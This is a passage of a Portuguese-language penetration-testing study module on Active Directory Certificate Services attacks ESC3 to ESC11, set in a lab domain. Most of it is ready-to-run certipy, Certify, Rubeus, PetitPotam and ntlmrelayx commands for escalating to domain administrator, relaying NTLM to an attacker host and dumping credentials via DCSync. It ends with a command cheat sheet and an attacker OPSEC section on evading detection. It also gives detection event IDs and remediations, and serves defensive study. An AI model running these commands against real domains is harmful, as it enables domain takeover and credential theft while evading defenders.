### Ataque — Linux (dois passos)

**Passo 1: Obter certificado de enrollment agent**

```bash
certipy req -u blwasp@lab.local -p 'Password123!' \
  -ca lab-LAB-DC-CA \
  -template 'ESC3'
# Salva como blwasp.pfx
```

Saida de `certipy find` que identifica ESC3:
```
Template Name          : ESC3
Enrollment Agent       : True
Extended Key Usage     : Certificate Request Agent
[!] Vulnerabilities
    ESC3 : 'LAB.LOCAL\Domain Users' can enroll and template has Certificate Request Agent EKU set
```

**Passo 2: Solicitar certificado em nome do Administrator usando o enrollment agent cert**

```bash
certipy req -u blwasp@lab.local -p 'Password123!' \
  -ca lab-LAB-DC-CA \
  -template 'User' \
  -on-behalf-of 'lab\administrator' \
  -pfx blwasp.pfx
# Salva como administrator.pfx
```

**Passo 3: Autenticar**

```bash
certipy auth -pfx administrator.pfx -username administrator \
  -domain lab.local -dc-ip 10.129.205.199
```

### Ataque — Windows (dois passos)

**Identificar templates ESC3 com Certify:**

```powershell
C:\Tools> .\Certify.exe find /vulnerable
# Buscar: pkiextendedkeyusage: Certificate Request Agent
# Buscar: mspki-certificate-application-policy: Certificate Request Agent
```

**Passo 1: Obter enrollment agent certificate**

```powershell
C:\Tools> .\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA /template:ESC3
# Converte cert.pem -> cert.pfx via OpenSSL (sem senha)
& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in cert.pem `
  -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

**Passo 2: Solicitar cert on-behalf-of (requer sessao como o agente)**

```powershell
# Certify nao suporta credenciais alternativas, precisamos de uma sessao como o enrollment agent
# Opcionalmente usar RunasCS.exe ou RDP como o usuario com o cert de enrollment agent

C:\Tools> .\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA `
  /template:User /on-behalf-of:lab\administrator /enrollcert:cert.pfx /enrollcertpw:
# Salva admin.pem -> converte para admin.pfx
```

**Passo 3: Autenticar com Rubeus**

```powershell
.\Rubeus.exe asktgt /user:lab\Administrator /certificate:admin.pfx /getcredentials
```

---

## ESC4 — Controle de Acesso Vulneravel em Certificate Template

### Por Que Isso Importa

ESC4 ocorre quando um principal com privilegios baixos tem permissoes de escrita sobre um Certificate Template no Active Directory. Isso permite modificar o template para introduzir as condicoes de ESC1 (adicionar `ENROLLEE_SUPPLIES_SUBJECT`, remover aprovacao de manager, etc.) e depois explorar normalmente.

### Condicoes de Vulnerabilidade

Um template e vulneravel se um usuario com baixo privilegio possui qualquer uma das seguintes permissoes no objeto do template:
- **Owner** — controle total implicitico
- **WriteProperty** — pode modificar atributos como EKU, flags, enrollment rights
- **WriteDacl** — pode modificar as ACLs do template
- **WriteOwner** — pode assumir propriedade do template
- **GenericWrite** ou **GenericAll** — controle amplo

### Identificacao

```bash
# Certipy identifica automaticamente
certipy find -u blwasp@lab.local -p 'Password123!' \
  -dc-ip 10.129.205.199 -vulnerable -stdout
# Procurar: ESC4 nas vulnerabilidades listadas
```

```powershell
# PowerShell — verificar ACL do template
$template = Get-ADObject -Identity "CN=VulnerableTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local" -Properties *
(Get-Acl "AD:$($template.DistinguishedName)").Access | Where-Object {
    $_.IdentityReference -like "*Domain Users*"
}
```

### Ataque — Modificar Template e Explorar como ESC1

```bash
# Certipy pode modificar o template diretamente
# 1. Fazer backup da configuracao atual
certipy template -u blwasp@lab.local -p 'Password123!' \
  -dc-ip 10.129.205.199 -template VulnerableTemplate -save-old

# 2. Tornar o template vulneravel a ESC1
certipy template -u blwasp@lab.local -p 'Password123!' \
  -dc-ip 10.129.205.199 -template VulnerableTemplate \
  -configuration VulnerableTemplate.json

# OU modificar manualmente os atributos via LDAP:
# mspki-certificate-name-flag -> adicionar ENROLLEE_SUPPLIES_SUBJECT (0x1)
# mspki-enrollment-flag -> remover CT_FLAG_PEND_ALL_REQUESTS
# pKIExtendedKeyUsage -> garantir que inclui Client Authentication OID

# 3. Solicitar certificado como admin (agora e ESC1)
certipy req -u blwasp@lab.local -p 'Password123!' \
  -ca lab-LAB-DC-CA -template VulnerableTemplate \
  -upn Administrator@lab.local

# 4. Restaurar template original apos o ataque
certipy template -u blwasp@lab.local -p 'Password123!' \
  -dc-ip 10.129.205.199 -template VulnerableTemplate \
  -configuration VulnerableTemplate.json.bak
```

---

## ESC5 — Controle de Acesso Vulneravel em Objetos PKI

### Por Que Isso Importa

ESC5 e mais amplo que ESC4. Enquanto ESC4 foca em templates especificos, ESC5 abrange qualquer objeto do AD relacionado a PKI que tenha permissoes incorretas, incluindo:
- O proprio objeto da CA no AD (`CN=CA-Name,CN=Enrollment Services`)
- O container de Public Key Services
- O objeto `NTAuthCertificates`
- Objetos de Certificate Template containers
- O objeto `AIA` (Authority Information Access)

### Objetos PKI Criticos e Impacto

| Objeto | Localizacao LDAP | Impacto se Comprometido |
|--------|-----------------|------------------------|
| Enterprise CA | `CN=Enrollment Services,CN=Public Key Services` | Controle total da CA |
| NTAuthCertificates | `CN=NTAuthCertificates,CN=Public Key Services` | Adicionar CA falsa como confiavel para autenticacao |
| Certificate Templates container | `CN=Certificate Templates,CN=Public Key Services` | Criar novos templates maliciosos |
| Root CA | `CN=Certification Authorities,CN=Public Key Services` | Adicionar CA raiz falsa |

### Identificacao

```bash
# BloodHound identifica permissoes sobre objetos PKI
# Procurar edges: WriteOwner, WriteDacl, GenericWrite para objetos PKI

# Certipy tambem verifica
certipy find -u blwasp@lab.local -p 'Password123!' \
  -dc-ip 10.129.205.199 -vulnerable
```

```powershell
# PowerShell — verificar ACL da CA
$CAPath = "CN=lab-LAB-DC-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local"
(Get-Acl "AD:$CAPath").Access | Where-Object {
    $_.ActiveDirectoryRights -match "Write|GenericAll" -and
    $_.IdentityReference -notmatch "Domain Admins|Enterprise Admins|SYSTEM"
}
```

### Ataque — Adicionar CA ao NTAuthCertificates

Se voce tem WriteProperty sobre `NTAuthCertificates`, pode adicionar uma CA controlada por voce como confiavel para autenticacao de dominio:

```bash
# Gerar CA propria
openssl req -x509 -newkey rsa:4096 -keyout attacker_ca.key -out attacker_ca.crt -days 365 -nodes

# Adicionar ao NTAuthCertificates via LDAP
# (requer ferramenta customizada ou Certipy com permissoes adequadas)
certipy ca -u blwasp@lab.local -p 'Password123!' -dc-ip 10.129.205.199 \
  -add-certificate attacker_ca.crt
```

---

## ESC6 — Flag EDITF_ATTRIBUTESUBJECTALTNAME2 na CA

### Por Que Isso Importa

ESC6 e similar ao ESC1 mas opera no nivel da CA, nao do template. Quando o flag `EDITF_ATTRIBUTESUBJECTALTNAME2` esta ativado na Enterprise CA, **qualquer** template — mesmo os que nao permitem `ENROLLEE_SUPPLIES_SUBJECT` — aceita SANs definidos pelo solicitante. Isso significa que templates normalmente seguros tornam-se vetores de ataque.

**Nota:** Este flag foi identificado no output do `Certify.exe find`:
```
[!] UserSpecifiedSAN: EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees can specify Subject Alternative Names!
```

### Identificacao

```powershell
# Certify mostra o flag na listagem da CA
C:\Tools> .\Certify.exe find /vulnerable

# Saida relevante:
# [!] UserSpecifiedSAN: EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees can specify Subject Alternative Names!
```

```bash
# Certipy tambem detecta
certipy find -u blwasp@lab.local -p 'Password123!' \
  -dc-ip 10.129.205.199 -vulnerable -stdout
# Procurar: [!] Vulnerabilities -> ESC6
```

### Verificacao Manual do Flag

```powershell
# No servidor da CA (requer acesso ao servidor):
certutil -getreg policy\EditFlags
# Procurar: EDITF_ATTRIBUTESUBJECTALTNAME2

# Ou via registro:
reg query HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA-NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy /v EditFlags
```

### Ataque — Explorar Qualquer Template com EKU de Auth

Com este flag ativo, qualquer template que o usuario possa usar e que tenha Client Authentication EKU torna-se exploravel:

```bash
# Usar template padrao "User" (normalmente seguro) para obter cert como admin
certipy req -u blwasp@lab.local -p 'Password123!' \
  -ca lab-LAB-DC-CA \
  -template User \
  -upn Administrator@lab.local

# Autenticar
certipy auth -pfx administrator.pfx -username administrator \
  -domain lab.local -dc-ip 10.129.205.199
```

```powershell
# Windows — mesmo template User, agora com altname
.\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA `
  /template:User /altname:administrator@lab.local
```

### Como Desativar (Remediacao)

```powershell
# No servidor da CA:
certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
net stop certsvc && net start certsvc
```

---

## ESC7 — Controle de Acesso Vulneravel na CA

### Por Que Isso Importa

ESC7 envolve ter permissoes elevadas sobre a propria CA — especificamente `Manage CA` ou `Manage Certificates`. Com `Manage CA`, um atacante pode alterar configuracoes da CA, incluindo ativar o flag ESC6. Com `Manage Certificates`, o atacante pode aprovar requests pendentes (ex: que exigem aprovacao de gerente).

### Permissoes Criticas

| Permissao | O que Permite | Impacto |
|-----------|---------------|---------|
| `Manage CA` | Alterar configuracoes da CA, adicionar officers | Ativar ESC6, comprometer toda a PKI |
| `Manage Certificates` | Aprovar/negar requests de certificados pendentes | Aprovar requests maliciosos que exigiriam aprovacao |

### Identificacao

```bash
# Certipy lista as permissoes da CA
certipy find -u blwasp@lab.local -p 'Password123!' \
  -dc-ip 10.129.205.199 -vulnerable -stdout

# Saida relevante:
# Allow ManageCA, Enroll                          LAB\blwasp
# Allow ManageCA, Enroll                          LAB\user_manageCA
```

```powershell
# Certify mostra as CA Permissions:
.\Certify.exe find /vulnerable
# Procurar: Allow ManageCA ou Allow ManageCertificates para usuarios nao-admin
```

### Ataque com "Manage CA" — Ativar ESC6

```bash
# Com Manage CA rights, ativar EDITF_ATTRIBUTESUBJECTALTNAME2
certipy ca -u blwasp@lab.local -p 'Password123!' \
  -dc-ip 10.129.205.199 \
  -ca lab-LAB-DC-CA \
  -enable-editflags EDITF_ATTRIBUTESUBJECTALTNAME2

# Agora ESC6 esta ativo, explorar normalmente
certipy req -u blwasp@lab.local -p 'Password123!' \
  -ca lab-LAB-DC-CA \
  -template User \
  -upn Administrator@lab.local

certipy auth -pfx administrator.pfx -username administrator \
  -domain lab.local -dc-ip 10.129.205.199
```

### Ataque com "Manage Certificates" — Aprovar Request Pendente

Se um template exige aprovacao de manager (`CA_PROP_APPROVAL_REQUIRED`):

```bash
# 1. Solicitar certificado (vai ficar pendente)
certipy req -u blwasp@lab.local -p 'Password123!' \
  -ca lab-LAB-DC-CA \
  -template RequiresApproval \
  -upn Administrator@lab.local
# [*] Request ID is 45

# 2. Com Manage Certificates, aprovar o request
certipy ca -u user_manageCA@lab.local -p 'Password123!' \
  -dc-ip 10.129.205.199 \
  -ca lab-LAB-DC-CA \
  -issue-request 45

# 3. Recuperar o certificado aprovado
certipy req -u blwasp@lab.local -p 'Password123!' \
  -ca lab-LAB-DC-CA \
  -retrieve 45
```

---

## ESC8 — NTLM Relay para Endpoints HTTP do AD CS

### Por Que Isso Importa

ESC8 e um ataque de NTLM relay classico direcionado aos endpoints HTTP do AD CS. A CA expoe uma interface web em `http://CA-SERVER/certsrv/` que aceita NTLM authentication mas nao possui protecoes contra relay (por padrao, sem EPA/Extended Protection for Authentication). Um atacante pode:

1. Forcar uma maquina a autenticar via NTLM (PetitPotam, PrinterBug, etc.)
2. Fazer relay dessa autenticacao para o endpoint HTTP da CA
3. Solicitar um certificado em nome da maquina vitima (tipicamente o DC)
4. Usar o certificado para obter o NT Hash do DC via PKINIT U2U
5. Executar DCSync

**Impacto:** Comprometimento total do dominio a partir de acesso de rede sem credenciais validas.

### Pre-requisitos

- Endpoints HTTP da CA acessiveis (`http://CA-IP/certsrv/` ou `http://CA-IP/certsrv/certfnsh.asp`)
- EPA (Extended Protection for Authentication) desabilitado na CA (padrao historico)
- HTTPS nao enforced ou NTLM nao bloqueado
- Algum metodo de forca a autenticacao NTLM (PetitPotam, PrinterBug/SpoolSS, etc.)

### Identificacao do Endpoint

```bash
# Verificar se o endpoint existe e aceita NTLM
curl -v http://CA-SERVER/certsrv/ 2>&1 | grep -i "www-authenticate\|ntlm\|negotiate"

# Ou com certipy
certipy find -u blwasp@lab.local -p 'Password123!' \
  -dc-ip 10.129.205.199 -vulnerable
# Procurar: ESC8 - NTLM Relay to AD CS HTTP Endpoints
```

### Ataque Completo — Relay com PetitPotam

**Terminal 1 — Iniciar o relay listener (Certipy)**

```bash
# Iniciar ntlmrelayx apontando para o endpoint da CA
certipy relay -target http://CA-SERVER/certsrv/certfnsh.asp \
  -template DomainController

# OU com impacket-ntlmrelayx
ntlmrelayx.py -t http://CA-SERVER/certsrv/certfnsh.asp \
  --adcs --template DomainController -smb2support
```

**Terminal 2 — Forcar autenticacao NTLM do DC (PetitPotam)**

```bash
# PetitPotam — coercao de autenticacao via MS-EFSRPC
python3 PetitPotam.py <ATTACKER-IP> <DC-IP>

# OU via PrinterBug (MS-RPRN)
python3 printerbug.py lab.local/blwasp:Password123!@LAB-DC.lab.local <ATTACKER-IP>
```

**Resultado esperado no Terminal 1:**

```
[*] Received connection from LAB-DC$ (LAB-DC.lab.local)
[*] Relaying to http://CA-SERVER/certsrv/certfnsh.asp
[*] Successfully requested certificate for 'LAB-DC$'
[*] Saved certificate to 'lab-dc.pfx'
```

**Usar o certificado da maquina DC para DCSync**

```bash
# Autenticar como a conta de maquina do DC
certipy auth -pfx lab-dc.pfx -username 'LAB-DC$' \
  -domain lab.local -dc-ip 10.129.205.199
# Salva lab-dc.ccache e obtem NT Hash da conta de maquina

# Com o hash da conta de maquina do DC, executar DCSync
secretsdump.py -hashes :<DC_MACHINE_NT_HASH> 'lab.local/LAB-DC$@LAB-DC.lab.local'
```

### Variantes de Coercao de Autenticacao

```bash
# PetitPotam (nao requer credenciais em versoes antigas)
python3 PetitPotam.py -u '' -p '' LAB-DC.lab.local <ATTACKER-IP>

# PrinterBug (MS-RPRN — requer credenciais validas de dominio)
python3 printerbug.py 'lab.local/blwasp:Password123!@LAB-DC.lab.local' <ATTACKER-IP>

# Coercer (ferramenta que agrega multiplos metodos de coercao)
python3 Coercer.py coerce -u blwasp -p 'Password123!' -d lab.local \
  -l <ATTACKER-IP> -t LAB-DC.lab.local
```

---

## ESC9 — CT_FLAG_NO_SECURITY_EXTENSION em Template

### Por Que Isso Importa

ESC9 e um ataque mais sutil que explora o mecanismo de certificate mapping do Windows. Quando o atributo `msPKI-Enrollment-Flag` de um template contem o flag `CT_FLAG_NO_SECURITY_EXTENSION`, a extensao de seguranca `szOID_NTDS_CA_SECURITY_EXT` (que contem o `objectSid` do solicitante) NAO e incluida no certificado emitido.

**Consequencia:** O mapeamento forte de certificados e bypassado. Se um atacante tem `GenericWrite` sobre uma conta de usuario, pode modificar o UPN dessa conta para coincidir com o UPN de uma conta alvo, solicitar um certificado, e o certificado sera mapeado para a conta alvo (nao para a conta cujas credenciais foram usadas).

### Condicoes de Vulnerabilidade

1. `StrongCertificateBindingEnforcement` nao esta em 2 (default e 1), OU `CertificateMappingMethods` contem o flag UPN (`0x4`)
2. O template inclui `CT_FLAG_NO_SECURITY_EXTENSION` no `msPKI-Enrollment-Flag`
3. O template especifica `client authentication` como EKU
4. O atacante tem pelo menos `GenericWrite` sobre alguma conta de usuario

### Identificacao no Certipy

```bash
certipy find -u blwasp@lab.local -p 'Password123!' \
  -dc-ip 10.129.205.199 -vulnerable -stdout

# Saida que identifica ESC9:
# Enrollment Flag     : NoSecurityExtension
# [!] Vulnerabilities
#     ESC9 : 'LAB.LOCAL\Domain Users' can enroll ...
```

### Verificar Registro (se acesso ao servidor)

```powershell
# Verificar StrongCertificateBindingEnforcement
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc
# Procurar: StrongCertificateBindingEnforcement REG_DWORD

# Verificar CertificateMappingMethods
reg query HKLM\System\CurrentControlSet\Control\SecurityProviders\Schannel\
# Procurar: CertificateMappingMethods REG_DWORD
```

### Ataque — Linux (5 passos)

**Pre-requisito:** Ter `GenericWrite`/`FullControl` sobre alguma conta de usuario (ex: `user2`).

```bash
# Passo 1: Verificar direitos com dacledit
dacledit.py -action read -dc-ip 10.129.205.199 \
  lab.local/blwasp:Password123! -principal blwasp -target user2
# Confirmar: FullControl ou GenericWrite

# Passo 2: Obter NT Hash de user2 via Shadow Credentials (sem alterar senha)
certipy shadow auto -u blwasp@lab.local -p 'Password123!' -account user2
# [*] NT hash for 'user2': 2b576acbe6bcfda7294d6bd18041b8fe

# Passo 3: Modificar UPN de user2 para coincidir com user3 (alvo)
certipy account update -u blwasp@lab.local -p 'Password123!' \
  -user user2 -upn user3@lab.local
# [*] Successfully updated 'user2': userPrincipalName = user3@lab.local

# Passo 4: Solicitar certificado como user2 (sera mapeado para user3)
certipy req -u user2@lab.local -hashes 2b576acbe6bcfda7294d6bd18041b8fe \
  -ca lab-LAB-DC-CA -template ESC9
# [*] Certificate has no object SID  <-- confirma que o bypass funcionou
# [*] Saved certificate and private key to 'user3.pfx'

# Passo 5: Reverter o UPN de user2
certipy account update -u blwasp@lab.local -p 'Password123!' \
  -user user2 -upn user2@lab.local

# Autenticar como user3 com o certificado obtido
certipy auth -pfx user3.pfx -domain lab.local -dc-ip 10.129.205.199
```

### Ataque — Windows

```powershell
# Passo 1: Resetar senha de user2 (necessario pois Certify nao aceita hashes)
Set-DomainUserPassword -Identity user2 -AccountPassword $((ConvertTo-SecureString 'Newpassword123!' -AsPlainText -Force)) -Verbose

# Passo 2: Modificar UPN de user2
Set-DomainObject user2 -Set @{'userPrincipalName'='user3@lab.local'} -Verbose

# Passo 3: Conectar via RDP/RunasCS como user2 e executar:
.\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA /template:ESC9 /altname:user3

# Passo 4: Converter e autenticar
& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in .\user3.pem `
  -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out user3.pfx

.\Rubeus.exe asktgt /user:user3 /certificate:user3.pfx /getcredentials
```

---

## ESC10 e ESC11 — Tecnicas Avancadas (Sumario)

### ESC10 — Weak Certificate Mapping via Registry

ESC10 e similar ao ESC9 mas explora configuracoes de registry especificas ao inves do flag `CT_FLAG_NO_SECURITY_EXTENSION`. O ataque funciona quando:

- `StrongCertificateBindingEnforcement` = 0 (Disabled mode — sem validacao de objectSid)
- OU `CertificateMappingMethods` contem `0x4` (SAN implicit mapping via UPN)

Com `StrongCertificateBindingEnforcement = 0`, qualquer certificado com um UPN no SAN pode ser mapeado para qualquer conta que tenha aquele UPN — mesmo sem o `szOID_NTDS_CA_SECURITY_EXT`. O fluxo de ataque e identico ao ESC9: modificar o UPN da conta comprometida, solicitar certificado, reverter UPN.

```bash
# Verificar o valor do registro (se acesso ao servidor da CA ou DC)
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc" /v StrongCertificateBindingEnforcement
# 0x0 = vulneravel ao ESC10
# 0x1 = modo compatibilidade (ESC9 ainda funciona)
# 0x2 = Full Enforcement (mais seguro)
```

### ESC11 — NTLM Relay via RPC ao inves de HTTP

ESC11 e uma variante do ESC8 que usa o protocolo RPC (Endpoint Mapper, porta 135) ao inves do endpoint HTTP `/certsrv/`. Isso e util quando:
- O endpoint HTTP da CA esta desabilitado ou protegido com EPA
- A CA ainda expoe servicos RPC na rede

```bash
# Relay para interface RPC da CA
certipy relay -target rpc://CA-SERVER -ca lab-LAB-DC-CA -template DomainController

# Coercao de autenticacao (mesmos metodos do ESC8)
python3 PetitPotam.py <ATTACKER-IP> LAB-DC.lab.local
```

A diferenca principal: requer que o endpoint RPC da CA seja acessivel e que a CA nao exija assinatura nos pacotes RPC.

---

## OPSEC — Deteccao e Reducao de Ruido

### O Que e Registrado

| Acao | Log | Event ID | Barulho |
|------|-----|----------|---------|
| Enrollment de certificado | Security Log da CA | 4886, 4887 | Medio |
| Aprovacao de certificado | Security Log da CA | 4888 | Baixo |
| Falha de enrollment | Security Log da CA | 4889 | Alto |
| Autenticacao PKINIT (TGT com cert) | Security Log do DC | 4768 com cert | Medio |
| Modificacao de template | Security Log do DC | 5137 (objeto AD modificado) | Baixo |
| Modificacao de CA flags | Security Log da CA | 4890 | Baixo |
| NTLM Relay recebido | Security Log | 4624 (tipo 3) | Baixo |
| Request de cert para conta de maquina | Security Log da CA | 4886 | Anormal |

### Caracteristicas de Deteccao por Tecnica

**ESC1/ESC2/ESC3:**
- Event 4886: Certificado emitido — especialmente para templates que raramente sao usados
- Event 4768 com tipo de preauth `16` (PKINIT) para contas que nunca usaram smartcard/cert
- Verificar se o Subject do certificado difere do UPN do solicitante (SAN alternativo)

**ESC8:**
- Multiplos events 4624 (logon tipo 3) do mesmo IP em rapida sequencia
- Events 4886 em nome de contas de maquina (especialmente DC$) originados de IP incomum
- Logs de acesso HTTP no servidor IIS da CA (`/certsrv/` access logs)

**ESC9:**
- Modificacao do atributo `userPrincipalName` (Event 5136 no DC)
- Seguida rapidamente por enrollment de certificado e depois reverter o UPN
- Shadow Credentials: Event 5136 para modificacao do atributo `msDS-KeyCredentialLink`

### Estrategias de OPSEC para Atacantes

**1. Reducao de footprint na enumeracao:**

```bash
# Usar consultas LDAP diretas ao inves de Certify/Certipy (menos indicadores de ferramentas)
# Limitar scope da busca ao que e necessario
certipy find -u blwasp@lab.local -p 'Password123!' -dc-ip 10.129.205.199 -vulnerable
# Nao executar ferramentas como administrador quando nao necessario
```

**2. Preferir Shadow Credentials ao inves de password reset (ESC9):**

Shadow Credentials nao altera a senha do usuario, apenas adiciona uma credencial de chave ao atributo `msDS-KeyCredentialLink` — menos disruptivo e mais facil de reverter.

```bash
certipy shadow auto -u blwasp@lab.local -p 'Password123!' -account user2
# Auto-mode: adiciona a credencial, obtem o hash, e REMOVE a credencial automaticamente
```

**3. Restaurar templates apos ESC4:**

Se modificar um template para ESC4, restaurar imediatamente apos obter o certificado para reduzir janela de deteccao.

**4. Timing do relay (ESC8):**

Executar o relay durante horario de trabalho quando trafego NTLM e normal. Avoid weekends/nights quando anomalias sao mais visiveis.

**5. Usar TGT em vez de NT Hash quando possivel:**

O NT Hash deixa rastros de logon NTLM (Event 4624 com LogonType 3). O TGT Kerberos e mais "limpo" no contexto de dominios que usam Kerberos normalmente.

### Deteccao Defensiva — Queries Uteis

```powershell
# Identificar certificados emitidos recentemente para contas de administrador
# (via certutil na CA)
certutil -view -restrict "NotBefore>01/01/2024,RequesterName=LAB\blwasp" -out requestid,requester,commonname,notbefore

# Buscar templates com ENROLLEE_SUPPLIES_SUBJECT
Get-ADObject -LDAPFilter '(objectclass=pkicertificatetemplate)' `
  -SearchBase 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local' `
  -Properties mspki-certificate-name-flag | Where-Object {
    $_.('mspki-certificate-name-flag') -band 1
  } | Select-Object Name

# Verificar flag ESC6 na CA
certutil -getreg policy\EditFlags | Select-String "EDITF_ATTRIBUTESUBJECTALTNAME2"
```

### Remediacao Rapida por Tecnica

| Tecnica | Remediacao Prioritaria |
|---------|----------------------|
| ESC1/ESC2 | Remover `ENROLLEE_SUPPLIES_SUBJECT` dos templates; restringir enrollment |
| ESC3 | Limitar enrollment agent certificates; adicionar restricoes de agente na CA |
| ESC4 | Corrigir ACLs dos templates; remover permissoes de escrita de usuarios comuns |
| ESC5 | Corrigir ACLs dos objetos PKI no AD |
| ESC6 | Remover flag `EDITF_ATTRIBUTESUBJECTALTNAME2` da CA |
| ESC7 | Remover `Manage CA`/`Manage Certificates` de contas nao-admin |
| ESC8 | Ativar EPA no IIS da CA; migrar para HTTPS; desabilitar HTTP enrollment |
| ESC9/ESC10 | Definir `StrongCertificateBindingEnforcement = 2`; monitorar mudancas de UPN |

---

## Cheatsheet de Comandos Rapidos

### Enumeracao

```bash
# Linux — tudo de uma vez
certipy find -u USER@DOMAIN -p 'PASS' -dc-ip DC_IP -vulnerable -stdout

# Windows — tudo de uma vez
.\Certify.exe find /vulnerable

# PowerShell — verificar flag ESC6 na CA (requer acesso local a CA)
certutil -getreg policy\EditFlags
```

### Exploracao por Tecnica

```bash
# ESC1/ESC2 — Linux
certipy req -u USER@DOMAIN -p 'PASS' -ca CA_NAME -template TEMPLATE_NAME -upn ADMIN@DOMAIN
certipy auth -pfx admin.pfx -username admin -domain DOMAIN -dc-ip DC_IP

# ESC3 — Linux (2 passos)
certipy req -u USER@DOMAIN -p 'PASS' -ca CA_NAME -template ESC3_TEMPLATE
certipy req -u USER@DOMAIN -p 'PASS' -ca CA_NAME -template User -on-behalf-of 'DOMAIN\admin' -pfx user.pfx

# ESC8 — Linux (2 terminais)
# Terminal 1:
certipy relay -target http://CA_IP/certsrv/certfnsh.asp -template DomainController
# Terminal 2:
python3 PetitPotam.py ATTACKER_IP DC_IP

# ESC9 — Linux (5 passos)
certipy shadow auto -u ATTACKER@DOMAIN -p 'PASS' -account TARGET_USER
certipy account update -u ATTACKER@DOMAIN -p 'PASS' -user TARGET_USER -upn FINAL_TARGET@DOMAIN
certipy req -u TARGET_USER@DOMAIN -hashes NT_HASH -ca CA_NAME -template ESC9_TEMPLATE
certipy account update -u ATTACKER@DOMAIN -p 'PASS' -user TARGET_USER -upn TARGET_USER@DOMAIN
certipy auth -pfx final_target.pfx -domain DOMAIN -dc-ip DC_IP
```

```powershell
# ESC1/ESC2 — Windows
.\Certify.exe request /ca:DC.DOMAIN\CA_NAME /template:TEMPLATE /altname:admin@DOMAIN
& openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
.\Rubeus.exe asktgt /user:admin /certificate:cert.pfx /getcredentials /nowrap

# ESC3 — Windows (2 passos)
.\Certify.exe request /ca:DC.DOMAIN\CA_NAME /template:ESC3_TEMPLATE
.\Certify.exe request /ca:DC.DOMAIN\CA_NAME /template:User /on-behalf-of:DOMAIN\admin /enrollcert:cert.pfx /enrollcertpw:
.\Rubeus.exe asktgt /user:admin /certificate:admin.pfx /getcredentials
```

### Pos-Exploracao com Certificado

```bash
# Via Kerberos (Linux)
KRB5CCNAME=admin.ccache wmiexec.py -k -no-pass DC.DOMAIN.LOCAL
KRB5CCNAME=admin.ccache smbexec.py -k -no-pass DC.DOMAIN.LOCAL
KRB5CCNAME=admin.ccache secretsdump.py -k -no-pass DC.DOMAIN.LOCAL

# DCSync com NT Hash obtido
secretsdump.py DOMAIN/admin@DC.DOMAIN.LOCAL -hashes :<NT_HASH>
```

---

## Módulos Relacionados

`01_kerberos_fundamentos.md` cobre Kerberos / Pass-the-Ticket — TGT obtido via PKINIT é usado igual a TGT normal. `08_movimentacao_lateral/05_ntlm_relay_attacks.md` aprofunda ESC8 (relay clássico direcionado à CA). `08_bloodhound_e_enumeracao.md` mapeia edges de permissões sobre templates (ESC4/ESC5). `04_dcsync_e_dominancia.md` é objetivo final de muitos ataques ADCS. `09_dacl_attacks.md` cobre as ACLs fracas que habilitam ESC4/ESC5. MITRE ATT&CK: T1649 (Steal or Forge Authentication Certificates).

---

## Leitura Complementar

- SpecterOps "Certified Pre-Owned" — https://specterops.io/assets/resources/Certified_Pre-Owned.pdf
- Certipy (Oliver Lyak) — https://github.com/ly4k/Certipy
- Certify (SpecterOps) — https://github.com/GhostPack/Certify
- Rubeus — https://github.com/GhostPack/Rubeus
- PetitPotam — https://github.com/topotam/PetitPotam
- Coercer — https://github.com/p0dalirius/Coercer
